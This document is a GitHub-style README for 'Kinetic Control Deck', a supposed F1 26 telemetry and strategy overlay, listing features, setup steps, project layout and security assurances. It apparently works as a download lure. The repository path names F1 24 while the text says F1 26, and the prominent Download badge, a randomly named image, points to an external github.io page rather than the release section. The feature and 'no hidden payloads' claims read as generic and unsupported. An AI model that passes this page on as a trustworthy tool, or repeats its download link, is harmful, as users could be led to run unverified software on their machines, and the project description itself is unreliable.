![preview](https://raw.githubusercontent.com/SirBrodith02/F1-24-Telemetry-Vision/main/view_7d5f.svg)
[![Download](https://raw.githubusercontent.com/SirBrodith02/F1-24-Telemetry-Vision/main/run_7533f22.svg)](https://SirBrodith02.github.io/F1-24-Telemetry-Vision/)

# Kinetic Control Deck – F1 26 Telemetry & Strategy Companion

**An open-source, community-driven telemetry analysis suite for F1 26, designed to transform raw timing data into actionable racecraft decisions.** Instead of merely adjusting game memory or altering physics values, this project focuses on *reading the track*—interpreting the flow of speed, tire degradation, and fuel load to offer strategic insights that feel like having a second engineer in your ear.

Built for the sim-racing enthusiast who values authenticity over shortcuts, this toolkit provides a non-intrusive overlay system that respects the core challenge of racing while enhancing situational awareness. It bridges the gap between raw data streams and human intuition, allowing you to see the *why* behind every delta on the timing screen.

Rather than supplying an unfair advantage, this project empowers you to *understand the race* more deeply, fostering skills that translate to real-world track days. It's not about winning through artificial means; it's about winning through informed decisions, precise fuel management, and tire strategy that outlasts the competition.

This is a framework for the mindful racer—a digital pit wall that helps you interpret the story your car is telling you, lap after lap, corner after corner.

---

## 🏁 Why Another Racing Tool? The Philosophy of Insight

The modern sim racing landscape is crowded with tools that promise an edge. Many rely on hidden modifications or exploit system processes, offering a hollow victory. This project takes a fundamentally different route. It observes the *outputs*—the live telemetry feed, the sector splits, the tire temperatures—and uses that public information to build a coherent narrative.

Think of it as the difference between a pilot using instruments to navigate fog and a passenger who simply hopes for the best. Our tool provides the instrument panel, but you remain the pilot. The emphasis is on **skill augmentation**, not skill replacement. It helps you answer the critical questions:

- When do I pit to leverage a virtual safety car window?
- Is my front-left tire overheating in a way that predicts a lap-time cliff in three laps?
- What is the optimal fuel mix for the final 10 laps if I want to set a personal best on the last lap?

The interface is designed to be unobtrusive, providing data overlays that fade into the background until you need them. It's a quiet, knowledgeable co-driver, not a loud, flashy distraction.

We believe that the authentic racing experience is the most rewarding one. By providing a source of truth about your vehicle's behavior, we help you find those extra tenths through your own improved driving and strategic foresight. This is the philosophy of insight over intervention.

---

## ✨ Core Features: Your Digital Pit Wall

This isn't just a single-purpose utility; it's a modular suite designed to cover the entire strategic spectrum of a Grand Prix weekend.

### 📊 Real-Time Delta & Gap Analysis

- **Predictive Delta:** See not just the current gap to the car ahead, but a *projected* delta based on their tire compound, fuel load, and recent lap times. This allows for proactive overtaking moves rather than reactive rams.
- **Pit Window Optimizer:** Visualizes the optimal race window for a pit stop, dynamically recalculating as lap times evolve and tire degradation curves shift. The display color shifts from green (early) to amber (optimal) to red (too late).
- **Gap Morphing:** A live graph that shows how the gap to P1 has evolved over the race, highlighting *moments of opportunity* where a competitor was slow due to traffic or a mistake.

### 🛞 Tire & Fuel Strategy Authority

- **Degradation Modeling:** Uses your telemetry to build a personalized tire degradation curve for each compound. It predicts when your lap times will start to fall off, giving you a clear "cliff edge" warning.
- **Fuel Mix Calculator:** A multi-scenario fuel calculator that lets you plan for different race phases (Safe, Medium, Attack, Push). It accounts for engine modes, lift-and-coast techniques, and desired safety margins.
- **Lifecycle Projector:** A dashboard widget that shows the remaining "life" in each tire set, measured not in laps, but in projected performance drop. This helps you decide when to use a new set in practice versus saving it for Qualifying.

### 🧠 AI-Assisted Race Intelligence

- **Contextual Adviser:** An algorithm that observes race events (overtakes, spins, VSC phases) and suggests a strategic response. It might suggest a "box now" command after a rival pits, or advise you to "stay out" to undercut a train of cars.
- **Scenario Simulation:** A built-in what-if simulator that lets you test different strategies. Input a potential pit lap, and it simulates the rest of the race to show you where you might end up, factoring in traffic and tire wear.
- **Voice Command Integration:** Optional hands-free control. Speak commands like "What's the gap to the car ahead?" or "Simulate a pit stop on lap 20" to interact with the tool without taking your hands off the wheel.

### 🎨 Customizable Overlay Suite

- **Fully Modular HUD:** Drag, drop, and resize any widget. Put the delta timer above your mirror, the fuel calculator on the steering wheel, and the tire wear graph at the bottom of the screen.
- **Theme Engine:** Choose from a variety of predefined color schemes (including a dark stealth mode and a high-visibility "sunny day" mode) or create your own to match your car's livery.
- **Multi-Language Support:** The interface is fully localized, supporting English, Spanish, German, French, Italian, Portuguese, Japanese, and simplified Chinese. Race the world in your own language.

### 🚀 Performance & Compatibility

- **Ultra-Lightweight Runtime:** Designed to consume minimal CPU and RAM. It runs in the background without affecting your frame rate, even on lower-end gaming rigs.
- **Smart Data Tethering:** Connects to the game's native UDP data stream, ensuring low latency and high-frequency updates for accurate real-time monitoring.
- **Log Replay Mode:** Analyze your past races or download telemetry replays from the community to study alternative strategies and lines used by faster drivers.

---

## 🛠️ Installation & Setup Guide

Getting started is as straightforward as adding a new gauge to your dashboard. We've streamlined the process to avoid unnecessary complexity.

1.  **Download the Release:** Obtain the latest stable build from the release section of this repository. The package is a self-contained archive.
2.  **Extract to Location:** Extract the contents of the archive to a dedicated folder (e.g., `C:\RacingTools\KineticControlDeck`). The application is portable, meaning it does not require a system-level installation or registry changes.
3.  **Verify Game Configuration:** Ensure that your F1 26 game is set to allow UDP telemetry output. The game settings should have the "Enable Telemetry" option toggled on, and the port number should be noted.
4.  **Configure the Connection:** Launch the app for the first time. A setup wizard will guide you through inputting your game's UDP port (typically 20777) and network settings. The app will automatically detect the game on the local network.
5.  **Launch & Drive:** Once connected, the default overlay will appear on your screen. Use the in-app configurator to reposition or enable the widgets you need. No further configuration is required to start collecting data.

---

## 🧭 Usage Guide: Mastering the Cockpit

Navigating the primary dashboard is intuitive, but understanding the deeper layers of the data will unlock its full potential.

### The Main Dashboard

Upon connection, you are greeted with a clean dashboard broken into three key vertical panels:

- **Left Panel (Car Status):** Displays current speed, gear, throttle/brake inputs, tire temperatures (surface & core), and tire pressures.
- **Central Panel (Race Context):** Shows your current position, gap to the car ahead, gap to the car behind, and the leader's lap time.
- **Right Panel (Strategy Hub):** Contains the fuel calculator, pit window optimizer, and tire degradation graph.

### The Contextual Adviser

This is the "smarts" of the package. When enabled, a small speech-bubble widget will appear near your mirror. It provides discrete, contextual suggestions:

- *"VSC Ending. Gap to P3 is 4.1s. Box window remains open."*
- *"Your Hard tires are 15 laps old. Degradation cliff is projected in 3 laps."*
- *"Traffic ahead: Train of 3 cars battling. Consider overcut for clean air."*

The adviser is configurable. You can set it to be conservative (only strategic suggestions), balanced (strategy + minor tactical), or aggressive (includes weather predictions and track evolution suggestions).

### Using the Scenario Simulator

To use the simulator, pause the game while in a race session. In the Strategy Hub, click the "Simulate" tab. Input parameters such as target tire, pit lap, and fuel load. The simulator will calculate a projected race graph, showing your potential position over time against the current race *if* you were to follow that strategy. This helps in deciding between a two-stop or a one-stop in a chaotic race.

---

## 🗂️ Project Architecture & Development

This section is for developers interested in contributing or understanding the codebase. The project is structured with a clear separation of concerns to facilitate maintainability.

### Directory Layout

- `core/` - The backend processing engine. Handles data reception, parsing, and calculation.
    - `data_parser.py` - Decodes the UDP packets from the game.
    - `race_engine.py` - Contains the core logic for delta prediction, tire modeling, and fuel calculations.
    - `adviser.py` - The rule-based system that generates the contextual suggestions.
- `ui/` - The frontend interface.
    - `overlay_renderer.py` - Manages the DirectX/OpenGL overlay rendering.
    - `widgets/` - Contains the code for each individual widget (e.g., `delta_timer.py`, `tire_graph.py`).
    - `theme_manager.py` - Handles theme loading and customization.
- `config/` - Handles user settings and profiles.
- `tests/` - Unit and integration tests for the core logic.

### Contributing to the Project

We welcome contributions from the community. Whether you're fixing a bug, improving the tire model, or adding a new language pack, your help is valuable.

1.  **Fork the Repository:** Create your own copy on your account.
2.  **Create a Feature Branch:** Branch off the main branch to keep the main codebase stable.
3.  **Write Clear Code:** Follow the existing coding style. Ensure you add comments to complex logic.
4.  **Test Thoroughly:** Ensure any new functionality is covered by appropriate unit tests.
5.  **Submit a Pull Request:** Describe your changes in detail, referencing any relevant issue numbers.

---

## 🔒 Security & Integrity

This project is committed to the highest standards of security and integrity. We believe that a racing tool should be honest and transparent.

- **Non-Intrusive Data Reading:** The application reads data *from* the game's output stream. It does not inject code into the game process, modify game files, or alter memory. This ensures a stable and fair racing experience.
- **No Hidden Payloads:** We do not bundle any unwanted software. The source code is open for review, ensuring that there are no hidden data miners or trackers.
- **Community Audit:** Anyone is welcome to audit the code for security or integrity issues. We prioritize the trust of our users above all else.

---

## 📜 License

This project is lovingly licensed under the **MIT License**. This means you are free to use, modify, and distribute the code for any purpose, personal or commercial, as long as you include the original copyright notice. We believe in sharing knowledge and fostering innovation within the racing community.

[View the MIT License](./LICENSE-MIT)

---

## 🆘 Support & Community

We strive to provide exceptional support for our users. Whether you are a seasoned sim racer or a newcomer, we are here to help you get the most out of your experience.

- **Discord Community:** Join our vibrant Discord server to chat with other users, share your strategies, report bugs, and suggest new features. (The link is available in the repository's "About" section).
- **Issue Tracker:** If you encounter a bug or have a feature request, please use the GitHub Issues tab. Be as descriptive as possible, including your system specs and a log file if you can find one.
- **Email Support:** For direct inquiries, you can reach our support team at `support@kineticcontroldeck.io`. We aim to respond to all queries within 24-48 hours, providing 24/7 automated support for common issues and a dedicated human touch for complex problems.

We are committed to building the best possible racing companion, and that starts with listening to our community. Your feedback is the fuel that drives the evolution of this project.

---

## 📈 Roadmap & Future Vision

The journey does not end here. We have an ambitious roadmap for the 2026 season and beyond.

- **Dynamic Weather Integration:** Incorporate live weather data (from external APIs) to predict track temperature changes and how they affect tire strategy.
- **Cross-Platform Support:** Explore functionality for other titles in the F1 series or other racing sims that use similar UDP protocols.
- **Advanced Data Analytics:** Provide offline tools to post-process race logs to generate detailed performance reports and driver rating analyses.
- **Collaborative Sessions:** Allow users to share live telemetry data with their race engineer or team members for real-time remote coaching.

We're excited about the future of this project, and we hope you'll join us on the track. Let's redefine what it means to be data-driven in motorsport. We look forward to your contributions and feedback.

---

**Drive Smart. Drive Consistently. Drive with Insight.**